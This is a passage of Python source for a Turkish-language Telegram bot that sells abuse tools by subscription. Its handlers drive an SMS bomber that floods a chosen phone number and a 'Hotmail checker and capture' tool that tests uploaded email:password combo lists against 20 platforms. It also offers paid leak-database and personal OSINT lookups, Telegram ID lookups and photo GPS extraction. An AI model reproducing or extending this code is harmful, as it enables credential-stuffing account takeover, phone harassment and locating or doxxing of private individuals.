               f"🔍 Telegram kullanıcı adı <b>veya</b> sayısal ID'yi sorgula.\n\n"
               f"<b>Desteklenen:</b>\n• 👤 Kullanıcı (username veya ID)\n• 👥 Grup\n• 📢 Kanal\n\n"
               f"<b>Rapor:</b> 📄 TXT dosyası olarak gelir.")
        bot_instance.reply_to(msg, txt, reply_markup=tgid_kb(uid), parse_mode="HTML")

    @bot_instance.message_handler(commands=["exif","foto","meta"])
    def cmd_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        bot_instance.reply_to(msg,
            "📸 <b>EXIF Metadata Okuyucu</b>\n" + "━" * 28 + "\n"
            "Analiz etmek istediğin fotoğrafı gönder.\n"
            "📋 <b>Okunacak Bilgiler:</b>\n"
            "• 📱 Cihaz markası ve modeli\n• 📅 Çekim tarihi ve saati\n"
            "• 📐 Çözünürlük ve teknik parametreler\n• 🎯 ISO, diyafram, obtüratör, odak\n"
            "• ⚡ Flaş durumu ve lens bilgisi\n• 📍 GPS koordinatları (varsa)\n"
            "• 🗺 Google Maps linki (varsa)\n• ⛰ Rakım ve GPS zamanı\n"
            "<i>⚠️ Sosyal medyadan indirilmiş fotoğraflarda EXIF silinmiş olabilir.</i>",
            parse_mode="HTML")

    @bot_instance.message_handler(commands=["sarki","muzik","music","song"])
    def cmd_music(msg):
        _process_music(msg, bot_instance)

    @bot_instance.message_handler(commands=["addbot"])
    def cmd_addbot(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        parts = msg.text.split()
        if len(parts) < 2:
            bot_instance.reply_to(msg, s(uid, "multi_bot_add_usage")); return
        token = parts[1].strip()
        if len(token) < 30:
            bot_instance.reply_to(msg, "❌ Geçersiz token formatı!"); return
        if token == BOT_TOKEN:
            bot_instance.reply_to(msg, "❌ Ana botun token'ı eklenemez!"); return
        with _PROC_LOCK:
            if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
                bot_instance.reply_to(msg, s(uid, "multi_bot_exists")); return
            try:
                success = _spawn_bot(token, uid)
                if success:
                    bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
                                                 owner=msg.from_user.first_name or str(uid)))
                else: bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
            except Exception as e:
                bot_instance.reply_to(msg, f"❌ Hata: {e}")

    @bot_instance.message_handler(commands=["video"])
    def cmd_video(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        m = bot_instance.reply_to(msg, s(uid, "video_ask"))
        bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))

    @bot_instance.message_handler(commands=["smsbomb","sms"])
    def cmd_smsbomb(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        with _SMS_LOCK:
            if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                sess = _SMS_SESSIONS[uid]
                bot_instance.reply_to(msg,
                    f"⚠️ <b>Aktif Bombardıman Var!</b>\n📱 Hedef: <code>{sess['target']}</code>\n"
                    f"📊 Gönderilen: <b>{sess['count']}</b>\n⚙️ Mod: <b>{sess.get('mode','—').upper()}</b>\n"
                    f"🛑 Önce durdurun: /smsstop")
                return
        m = bot_instance.reply_to(msg,
            "💣 <b>SMS Bomber</b>\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: <code>5306524123</code>")
        bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))

    @bot_instance.message_handler(commands=["smsstop"])
    def cmd_smsstop(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS or not _SMS_SESSIONS[uid].get("running"):
                bot_instance.reply_to(msg, "❌ Aktif SMS bombardımanı bulunamadı."); return
            sess = _SMS_SESSIONS[uid]; sess["event"].set(); sess["running"] = False
            bot_instance.reply_to(msg,
                f"🛑 <b>SMS Bomber Durduruldu</b>\n📱 Hedef: <code>{sess['target']}</code>\n"
                f"📊 Toplam Gönderilen: <b>{sess['count']}</b> SMS")

    @bot_instance.message_handler(commands=["smsstatus"])
    def cmd_smsstatus(msg):
        uid = msg.from_user.id
        with _SMS_LOCK:
            if uid not in _SMS_SESSIONS:
                bot_instance.reply_to(msg, "📊 Hiç SMS bombardımanı başlatılmadı."); return
            sess = dict(_SMS_SESSIONS[uid])
            status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
            bot_instance.reply_to(msg,
                f"📊 <b>SMS Bomber Durumu</b>\n📱 Hedef: <code>{sess['target']}</code>\n"
                f"📌 Durum: <b>{status}</b>\n⚙️ Mod: <b>{sess.get('mode','—').upper()}</b>\n"
                f"📊 Gönderilen: <b>{sess['count']}</b> SMS\n🕐 Başlangıç: {sess.get('start_time','—')}")

    @bot_instance.message_handler(commands=["admin"])
    def cmd_admin(msg):
        uid = msg.from_user.id
        if uid != ADMIN_ID:
            bot_instance.reply_to(msg, s(uid, "admin_only")); return
        mk = InlineKeyboardMarkup(row_width=2)
        mk.add(
            _btn("📊 Bot İstatistik","adm_stats"),
            _btn("⭐ Premium Kullanıcılar","adm_prem_users"),
            _btn("📋 Premium Log","adm_prem_log"),
            _btn("⭐ Premium Ver","adm_give_premium"),
            _btn("➖ Premium Kaldır","adm_remove"),
            _btn("🚫 Kullanıcı Banla","adm_ban"),
            _btn("✅ Kullanıcı Ban Kaldır","adm_unban"),
            _btn("📋 Yasaklı Listesi","adm_banned"),
            _btn("📢 Duyuru Gönder","adm_announce"),
            _btn("🤖 Tüm Botları Listele","adm_listbots"),
            _btn("📋 Hotmail Log","adm_hotmail_log"),
            _btn("🆔 TG-ID Bakiye Ver","adm_tgid_give"),
            _btn("➖ TG-ID Bakiye Al","adm_tgid_take"),
            _btn("📋 TG-ID Logları","adm_tgid_logs"),
            _btn("💰 TG-ID Satın Almalar","adm_tgid_purchases"),
        )
        bot_instance.reply_to(msg, "👑 <b>ADMIN PANELİ</b>", reply_markup=mk)

    @bot_instance.message_handler(content_types=["photo","document"])
    def handle_photo_exif(msg):
        uid = msg.from_user.id
        add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        caption = (msg.caption or "").strip().lower()
        exif_trigger = any(caption == t or caption.startswith(t + " ") for t in ("/exif","/meta","/foto","exif","meta"))
        if msg.content_type == "document":
            doc = msg.document
            if doc.mime_type not in ("image/jpeg","image/jpg","image/png","image/tiff","image/webp","image/heic"):
                if exif_trigger:
                    bot_instance.reply_to(msg, "❌ Bu dosya bir resim değil!\nDesteklenen: JPEG, PNG, TIFF, WEBP")
                return
            if caption != "" and not exif_trigger: return
        wait_msg = bot_instance.reply_to(msg, "🔍 Fotoğraf analiz ediliyor...")
        gecici = f"/tmp/exif_{uid}_{int(time.time())}.jpg"
        try:
            if msg.content_type == "photo":
                file_info = bot_instance.get_file(msg.photo[-1].file_id)
                dosya = bot_instance.download_file(file_info.file_path)
            else:
                file_info = bot_instance.get_file(msg.document.file_id)
                dosya = bot_instance.download_file(file_info.file_path)
            with open(gecici, "wb") as f: f.write(dosya)
            sonuc, hata = _exif_analiz(gecici)
            if hata:
                bot_instance.edit_message_text(hata, wait_msg.chat.id, wait_msg.message_id, parse_mode="HTML"); return
            mesaj = _exif_mesaj_olustur(sonuc)
            bot_instance.edit_message_text(mesaj, wait_msg.chat.id, wait_msg.message_id,
                                           parse_mode="HTML", disable_web_page_preview=False)
        except Exception as e:
            try:
                bot_instance.edit_message_text(f"❌ Beklenmeyen hata: <code>{e}</code>",
                                               wait_msg.chat.id, wait_msg.message_id, parse_mode="HTML")
            except: bot_instance.reply_to(msg, f"❌ Hata: {e}")
        finally:
            try: os.remove(gecici)
            except: pass

    MENU_KEYS = {
        "tr": {"combo":"📦 Combo Çek","tools":"🛠 Araçlar","stats":"📊 İstatistik",
               "profile":"👤 Profil","lb":"🏆 Lider Tablosu","api":"⚙️ API Değiştir","help":"❓ Yardım"},
        "en": {"combo":"📦 Combo Check","tools":"🛠 Tools","stats":"📊 Statistics",
               "profile":"👤 Profile","lb":"🏆 Leaderboard","api":"⚙️ Change API","help":"❓ Help"},
        "ar": {"combo":"📦 فحص كومبو","tools":"🛠 الأدوات","stats":"📊 الإحصائيات",
               "profile":"👤 الملف الشخصي","lb":"🏆 المتصدرون","api":"⚙️ تغيير API","help":"❓ مساعدة"},
    }

    @bot_instance.message_handler(func=lambda m: True, content_types=["text"])
    def handle_text(msg):
        uid = msg.from_user.id
        if is_banned(uid):
            bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}"); return
        txt = msg.text
        keys = MENU_KEYS.get(lang(uid), MENU_KEYS["tr"])
        if txt == keys.get("combo"):
            m = bot_instance.reply_to(msg, s(uid, "combo_ask"))
            bot_instance.register_next_step_handler(m, lambda m: _process_combo(m, bot_instance))
        elif txt == keys.get("tools"):
            bot_instance.reply_to(msg, s(uid, "select_op"), reply_markup=tools_kb(uid))
        elif txt == keys.get("stats"): _show_stats(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("profile"): _show_profile(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("lb"): _show_leaderboard(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("api"): _show_api_menu(msg.chat.id, uid, bot_instance)
        elif txt == keys.get("help"): _show_help(msg.chat.id, uid, bot_instance)

    @bot_instance.callback_query_handler(func=lambda c: True)
    def handle_cb(call):
        try:
            uid = call.from_user.id
            data = call.data
            if data.startswith("lang_"):
                l = data[5:]
                db_set(uid, "language", l)
                name = call.from_user.first_name or "User"
                status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
                try: bot_instance.answer_callback_query(call.id, s(uid, "lang_ok"))
                except: pass
                try: bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    s(uid, "welcome", name=name, status=status), reply_markup=main_kb(uid))
                return
            if data == "noop":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "goto_home":
                try: bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                except: pass
                bot_instance.send_message(call.message.chat.id, "🏠", reply_markup=main_kb(uid))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "goto_tools":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(s(uid, "select_op"), call.message.chat.id,
                                                   call.message.message_id, reply_markup=tools_kb(uid))
                except: bot_instance.send_message(call.message.chat.id, s(uid, "select_op"), reply_markup=tools_kb(uid))
                return
            if data == "menu_turkey":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try: bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=turkey_kb(uid))
                except: bot_instance.send_message(call.message.chat.id, "🇹🇷", reply_markup=turkey_kb(uid))
                return
            if data == "menu_ls":
                if not is_premium_osint(uid):
                    mk = InlineKeyboardMarkup()
                    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
                    mk.add(_btn(s(uid, "back_btn"), "goto_tools"))
                    txt = ("🔒 <b>LeakSights OSINT — Premium</b>\n💰 Fiyat: 200 Yıldız\n"
                           "♾️ Süre: Sınırsız (Ömür Boyu)\n🔍 30+ OSINT Sorgu")
                    try: bot_instance.answer_callback_query(call.id)
                    except: pass
                    try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=mk)
                    except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=mk)
                else:
                    try: bot_instance.answer_callback_query(call.id)
                    except: pass
                    try: bot_instance.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=ls_kb(uid))
                    except: bot_instance.send_message(call.message.chat.id, "🌍 LeakSights", reply_markup=ls_kb(uid))
                return
            if data == "buy_premium":
                if is_premium(uid):
                    try: bot_instance.answer_callback_query(call.id, "⭐ Zaten Premium sahibisiniz!", show_alert=True)
                    except: pass
                    return
                prices = [LabeledPrice(label="⭐ Premium Üyelik", amount=PREMIUM_PRICE)]
                bot_instance.send_invoice(call.message.chat.id, title="Premium Üyelik",
                    description="Sınırsız Hotmail + Capture + Keyword + TG-ID",
                    invoice_payload="premium", provider_token="", currency="XTR", prices=prices)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "buy_osint":
                if is_premium_osint(uid):
                    try: bot_instance.answer_callback_query(call.id, "🌍 Zaten OSINT Premium sahibisiniz!", show_alert=True)
                    except: pass
                    return
                prices = [LabeledPrice(label="🌍 OSINT Premium", amount=OSINT_PRICE)]
                bot_instance.send_invoice(call.message.chat.id, title="OSINT Premium",
                    description="LeakSights OSINT - 30+ Sorgu",
                    invoice_payload="osint", provider_token="", currency="XTR", prices=prices)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            # ═══ 🆔 TG-ID CALLBACK'LERİ ═══
            if data == "tool_tgid":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
                balance = tgid_get_balance(uid)
                if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
                elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
                else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
                txt = (f"🆔 <b>TELEGRAM ID SORGU</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n"
                       f"🔍 Telegram kullanıcı adı <b>veya</b> sayısal ID'yi sorgula.\n\n"
                       f"<b>Desteklenen:</b>\n• 👤 Kullanıcı (username veya ID)\n• 👥 Grup\n• 📢 Kanal\n\n"
                       f"<b>Rapor:</b> 📄 TXT dosyası olarak gelir.")
                try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=tgid_kb(uid), parse_mode="HTML")
                except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_kb(uid), parse_mode="HTML")
                return
            if data == "tgid_search":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    "🔍 <b>Telegram ID Sorgu</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    "Sorgulamak istediğin kullanıcı adını veya ID'yi yaz:\n\n"
                    "📌 <b>Örnekler:</b>\n• <code>@durov</code>\n• <code>durov</code>\n• <code>7814538345</code> (sayısal ID)",
                    parse_mode="HTML")
                bot_instance.register_next_step_handler(m, lambda m: tgid_process_search(m, bot_instance))
                return
            if data == "tgid_packages":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                txt = (f"💎 <b>BAKİYE PAKETLERİ</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                       f"Aşağıdan paket seç, Telegram Stars ile öde.\n\n"
                       f"• <b>{TGID_PACKAGE_25} Sorgu</b> → {TGID_PRICE_25} ⭐\n"
                       f"• <b>{TGID_PACKAGE_50} Sorgu</b> → {TGID_PRICE_50} ⭐\n"
                       f"• <b>{TGID_PACKAGE_100} Sorgu</b> → {TGID_PRICE_100} ⭐")
                try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=tgid_packages_kb(), parse_mode="HTML")
                except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_packages_kb(), parse_mode="HTML")
                return
            if data == "tgid_my_stats":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                tgid_show_my_stats(call.message.chat.id, uid, bot_instance)
                return
            if data.startswith("tgid_buy_"):
                pkg_num = data.replace("tgid_buy_", "")
                pkg_map = {"25":(TGID_PACKAGE_25,TGID_PRICE_25,"25 Sorgu"),
                           "50":(TGID_PACKAGE_50,TGID_PRICE_50,"50 Sorgu"),
                           "100":(TGID_PACKAGE_100,TGID_PRICE_100,"100 Sorgu")}
                if pkg_num not in pkg_map:
                    try: bot_instance.answer_callback_query(call.id, "❌ Geçersiz paket!", show_alert=True)
                    except: pass
                    return
                qty, stars, label = pkg_map[pkg_num]
                prices = [LabeledPrice(label=label, amount=stars)]
                try:
                    bot_instance.send_invoice(chat_id=call.message.chat.id, title=f"💎 {label}",
                        description=f"{qty} adet Telegram ID sorgu hakkı",
                        invoice_payload=f"tgid_{pkg_num}", provider_token="", currency="XTR", prices=prices)
                    bot_instance.answer_callback_query(call.id, "✅ Fatura gönderildi!")
                except Exception as e:
                    bot_instance.answer_callback_query(call.id, f"❌ Hata: {e}", show_alert=True)
                return
            if data == "tool_exif":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    "📸 <b>EXIF Metadata Okuyucu</b>\n" + "━" * 28 + "\n"
                    "Analiz etmek istediğin fotoğrafı gönder.", parse_mode="HTML")
                return
            if data == "tool_music":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                bot_instance.send_message(call.message.chat.id,
                    "🎵 **Müzik İndirici**\n━━━━━━━━━━━━━━━━━━━━━\n"
                    "📌 **Kullanım:**\n`/sarki Sanatçı Şarkı`\n📁 Format: `.mp3` / `.m4a`")
                return
            if data.startswith("sms_"):
                parts = data.split("_")
                mode = parts[1]; phone = parts[2]; mail = parts[3] if len(parts) > 3 else ""
                if mode == "normal":
                    m = bot_instance.send_message(call.message.chat.id,
                        f"⚡ **Normal Mod Seçildi**\n📱 Hedef: <code>{phone}</code>\n"
                        f"🔢 Limit gir (Sonsuz için 0):\n⏱ Aralık gir (saniye):\n"
                        f"Örnek: <code>50 2</code>")
                    bot_instance.register_next_step_handler(m, lambda m: _sms_normal_settings(m, phone, mail, bot_instance))
                else:
                    _launch_sms_bomb(uid, phone, mail, "turbo", None, 0, bot_instance)
                    try: bot_instance.answer_callback_query(call.id, "🚀 Turbo mod başlatıldı!")
                    except: pass
                return
            if data == "tool_addbot":
                prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get("addbot")
                m = bot_instance.send_message(call.message.chat.id, prompt)
                bot_instance.register_next_step_handler(m, lambda m: _process_addbot(m, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_php2py":
                bot_instance.send_message(call.message.chat.id, s(uid, "php2py"))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_smsbomb":
                with _SMS_LOCK:
                    if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                        try: bot_instance.answer_callback_query(call.id, "⚠️ Aktif bombardıman var!", show_alert=True)
                        except: pass
                        return
                m = bot_instance.send_message(call.message.chat.id,
                    "💣 <b>SMS Bomber</b>\n📱 Hedef numarayı girin:\nÖrnek: <code>5306524123</code>")
                bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data == "tool_hotmail":
                user_name = get_user_name(uid); keywords = get_user_keywords(uid)
                limit_text = get_keyword_limit_text(uid); is_prem = is_premium(uid)
                capture_left = get_capture_limit_text(uid)
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(
                        f"📧 **HOTMAIL CHECKER & CAPTURE**\n━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 Kullanıcı: {user_name}\n🔖 Keyword: {', '.join(keywords)}\n"
                        f"📊 Keyword Limit: {limit_text}\n"
                        f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
                        f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n"
                        f"📌 Aşağıdaki menüden işlem yapın:",
                        call.message.chat.id, call.message.message_id, reply_markup=hotmail_keyboard(uid))
                except:
                    bot_instance.send_message(call.message.chat.id,
                        "📧 **HOTMAIL CHECKER & CAPTURE**\n📌 Aşağıdaki menüden işlem yapın:",
                        reply_markup=hotmail_keyboard(uid))
                return
            if data == "hotmail_start":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                is_prem = is_premium(uid)
                limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
                m = bot_instance.send_message(call.message.chat.id,
                    f"📧 **Hotmail Checker**\n📌 Limit: {limit} satır\n"
                    f"🔖 Keyword Limit: {get_keyword_limit_text(uid)}\n"
                    f"{'⭐ Premium' if is_prem else '🆓 Free'}\n"
                    f"Lütfen combo dosyasını (email:password) gönderin.")
                bot_instance.register_next_step_handler(m, lambda m: _process_hotmail_file(m, bot_instance))
                return
            if data == "hotmail_addkw":
                if not can_add_keyword(uid):
                    try: bot_instance.answer_callback_query(call.id, f"❌ Keyword limiti dolu! Maksimum: {get_keyword_limit_text(uid)}", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    f"➕ **Keyword Ekle**\nMevcut: {', '.join(get_user_keywords(uid))}\n"
                    f"Limit: {get_keyword_limit_text(uid)}\nEklemek istediğin keyword'ü yaz:")
                bot_instance.register_next_step_handler(m, lambda m: _process_add_keyword(m, bot_instance, uid))
                return
            if data == "hotmail_delkw":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id,
                    f"🗑️ **Keyword Sil**\nMevcut: {', '.join(get_user_keywords(uid))}\n"
                    f"Silmek istediğin keyword'ü yaz:")
                bot_instance.register_next_step_handler(m, lambda m: _process_del_keyword(m, bot_instance, uid))
                return
            if data == "hotmail_resetkw":
                set_user_keywords(uid, ["tiktok","instagram","netflix"])
                try: bot_instance.answer_callback_query(call.id, "✅ Keywordler varsayılana sıfırlandı!", show_alert=True)
                except: pass
                return
            if data == "capture_menu":
                if not can_use_capture(uid):
                    try: bot_instance.answer_callback_query(call.id, f"❌ Capture hakkınız doldu!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text(
                        f"📸 **CAPTURE TOOL**\n━━━━━━━━━━━━━━━━━━━━━\n"
                        f"👤 Kullanıcı: {get_user_name(uid)}\n📊 Platform: 20 Farklı\n"
                        f"{'⭐ Premium (Sınırsız)' if is_premium(uid) else f'🆓 Free ({get_capture_limit_text(uid)} kaldı)'}\n"
                        f"📌 Aşağıdan platform seçin:",
                        call.message.chat.id, call.message.message_id, reply_markup=capture_keyboard(uid))
                except:
                    bot_instance.send_message(call.message.chat.id, "📸 **CAPTURE TOOL**", reply_markup=capture_keyboard(uid))
                return
            if data == "goto_hotmail":
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                try:
                    bot_instance.edit_message_text("📧 **HOTMAIL CHECKER & CAPTURE**\n📌 Aşağıdaki menüden işlem yapın:",
                                                   call.message.chat.id, call.message.message_id, reply_markup=hotmail_keyboard(uid))
                except: pass
                return
            if data == "capture_all":
                if not is_premium(uid):
                    try: bot_instance.answer_callback_query(call.id, "🔒 Bu özellik sadece Premium!", show_alert=True)
                    except: pass
                    return
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                m = bot_instance.send_message(call.message.chat.id, "📸 **Tüm Platformlar**\nLütfen combo dosyasını gönderin.")
                bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, None))
                return
            if data.startswith("capture_"):
                try:
                    num = int(data.split("_")[1])
                    if num in CAPTURE_APPS:
                        target_app = CAPTURE_APPS[num]; platform_name = CAPTURE_NAMES[num]
                        try: bot_instance.answer_callback_query(call.id)
                        except: pass
                        m = bot_instance.send_message(call.message.chat.id,
                            f"📸 **{platform_name} Seçildi**\nLütfen combo dosyasını gönderin.")
                        bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, target_app))
                except: pass
                return
            if data.startswith("tool_"):
                key = data[5:]
                if key == "video":
                    m = bot_instance.send_message(call.message.chat.id, s(uid, "video_ask"))
                    bot_instance.register_next_step_handler(m, lambda m: _process_video(m, bot_instance))
                elif key == "predunyam":
                    _run_predunyam(call.message.chat.id, uid, bot_instance)
                elif key == "php2py":
                    bot_instance.send_message(call.message.chat.id, s(uid, "php2py"))
                elif key in ("proxycheck","urlscan"):
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt)
                    bot_instance.register_next_step_handler(m, lambda m: _process_special_tool(m, key, bot_instance))
                elif key in TOOLS_API:
                    prompt = TOOL_PROMPTS.get(lang(uid), TOOL_PROMPTS["tr"]).get(key)
                    m = bot_instance.send_message(call.message.chat.id, prompt)
                    bot_instance.register_next_step_handler(m, lambda m: _process_generic_tool(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("tr_"):
                key = data[3:]
                prompt = TURKEY_PROMPTS.get(lang(uid), TURKEY_PROMPTS["tr"]).get(key, s(uid, "enter_val"))
                m = bot_instance.send_message(call.message.chat.id, s(uid, "tr_ask", prompt=prompt))
                bot_instance.register_next_step_handler(m, lambda m: _process_turkey(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("ls_"):
                if not is_premium_osint(uid):
                    try: bot_instance.answer_callback_query(call.id, "🌍 OSINT Premium gerekli!", show_alert=True)
                    except: pass
                    return
                key = data[3:]
                info = LEAKSIGHTS_API.get(key, {})
                m = bot_instance.send_message(call.message.chat.id,
                    s(uid, "ls_ask", icon=info.get("icon","🔍"),
                      tool=info.get(lang(uid), info.get("tr", key))))
                bot_instance.register_next_step_handler(m, lambda m: _process_ls(m, key, bot_instance))
                try: bot_instance.answer_callback_query(call.id)
                except: pass
                return
            if data.startswith("adm_"):
                if uid != ADMIN_ID:
                    try: bot_instance.answer_callback_query(call.id, s(uid, "admin_only"), show_alert=True)
                    except: pass
                    return
                _handle_admin_cb(call, data[4:], bot_instance)
                return
            if data.startswith("setapi_"):
                val = data[7:]
                if val == "default":
                    db_set(uid, "api_pref", 0)
                    try: bot_instance.answer_callback_query(call.id, "✅ Varsayılan API")
                    except: pass
                else:
                    idx = int(val); db_set(uid, "api_pref", idx)
                    try: bot_instance.answer_callback_query(call.id, f"✅ {API_LIST[idx]['name']}")
                    except: pass
                _show_api_menu(call.message.chat.id, uid, bot_instance,
                               edit=(call.message.chat.id, call.message.message_id))
                return
        except Exception as e:
            print(f"[CALLBACK ERROR] {e}")
            try: bot_instance.answer_callback_query(call.id, "⚠️ Bir hata oluştu!", show_alert=True)
            except: pass

    @bot_instance.pre_checkout_query_handler(func=lambda q: True)
    def precheckout(q):
        bot_instance.answer_pre_checkout_query(q.id, ok=True)

    @bot_instance.message_handler(content_types=["successful_payment"])
    def payment_ok(msg):
        uid = msg.from_user.id
        username = msg.from_user.username or msg.from_user.first_name or str(uid)
        payload = msg.successful_payment.invoice_payload
        if payload.startswith("tgid_"):
            pkg_num = payload.replace("tgid_", "")
            pkg_map = {"25":(TGID_PACKAGE_25,TGID_PRICE_25,"25 Sorgu"),
                       "50":(TGID_PACKAGE_50,TGID_PRICE_50,"50 Sorgu"),
                       "100":(TGID_PACKAGE_100,TGID_PRICE_100,"100 Sorgu")}
            if pkg_num in pkg_map:
                qty, stars, label = pkg_map[pkg_num]
                tgid_add_balance(uid, qty)
                tgid_log_purchase(uid, username, label, qty, stars)
                bot_instance.reply_to(msg,
                    f"🎉 <b>Ödeme Başarılı!</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
                    f"💎 Paket: <b>{label}</b>\n➕ Eklenen: <b>+{qty}</b> Telegram ID sorgu hakkı\n"
                    f"💰 Yeni Bakiye: <b>{tgid_get_balance(uid)}</b>\n\n"
                    f"Hemen sorgulamaya başlayabilirsin! 🔍", parse_mode="HTML")
                try:
                    bot_instance.send_message(ADMIN_ID,
                        f"💰 <b>YENİ TG-ID SATIN ALMA!</b>\n👤 @{username}\n📦 {label} — {stars} ⭐")
                except: pass
            return
        if payload == "premium":
            set_premium(uid, username)
            bot_instance.reply_to(msg, "🎉 **Hotmail Premium aktif!**\n📧 Sınırsız Hotmail + 📸 Sınırsız Capture + 🔖 Sınırsız Keyword + 🆔 Sınırsız TG-ID erişimi kazandın.")
            bot_instance.send_message(ADMIN_ID, f"📧 <b>YENİ HOTMAIL PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {PREMIUM_PRICE} Stars")
        elif payload == "osint":
            set_premium_osint(uid, username)
            bot_instance.reply_to(msg, "🌍 **OSINT Premium aktif!**\n🔍 LeakSights OSINT (30+ Sorgu) erişimi kazandın.")
            bot_instance.send_message(ADMIN_ID, f"🌍 <b>YENİ OSINT PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {OSINT_PRICE} Stars")

# ══════════════════════════════════════════════════════════════
#  PROCESS FUNCTIONS
# ══════════════════════════════════════════════════════════════
def _resolve_target(text):
    text = text.strip()
    if text.startswith("@"):
        username = text[1:]
        row = find_user_by_username(username)
        return (row[0], row[1]) if row else (None, None)
    elif text.isdigit():
        user_id = int(text)
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT user_id, username FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
        conn.close()
        return (row[0], row[1] or str(row[0])) if row else (user_id, str(user_id))
